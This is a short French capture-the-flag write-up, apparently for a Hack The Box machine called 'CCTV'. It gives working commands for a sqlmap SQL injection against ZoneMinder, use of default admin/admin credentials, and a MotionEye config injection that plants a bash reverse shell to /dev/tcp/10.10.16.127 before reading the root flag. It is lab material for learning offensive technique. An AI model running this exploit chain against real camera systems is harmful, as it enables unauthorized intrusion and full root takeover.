# CCTV

	echo "10.129.3.84 cctv.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.3.84 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.3.84 -oN nmap.txt
	
Scans classiques.      
Résultats :

    PORT      STATE    SERVICE        REASON      VERSION
    22/tcp    open     ssh            syn-ack     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
    80/tcp    open     http           syn-ack     Apache httpd 2.4.58

CVE sur ZoneMinder : 
- https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3

On a aussi un admin/admin sur le login du staff, ce qui permet d'arriver au point d'injection.

Exploitation : 

```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm --tables --cookie="ZMSESSID=<COOKIE>" -p tid --technique=T --threads 20
```

On récupère le hash de Mark et il est facilement cassable. 

    ssh mark@cctv.htb

## Élévation de privilèges

    netstat -pentula

On voit plusieurs services qui tournent en tant que root. Dont un MotionEye sur le port 8765 : 

    curl http://127.0.0.1:8765

Il existe aussi un CVE dessus : 
- https://github.com/advisories/GHSA-j945-qm58-4gjx

Exploitation : 

```
curl -s "http://127.0.0.1:7999/1/config/set?picture_output=on"
curl -s "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.127%2F9999%200%3E%261%27%29"
curl -s "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
curl -s "http://127.0.0.1:7999/1/action/snapshot"
```

Réception : 

```
nc -nlvp 9999
cat /home/sa_mark/user.txt
cat /root/root.txt
```
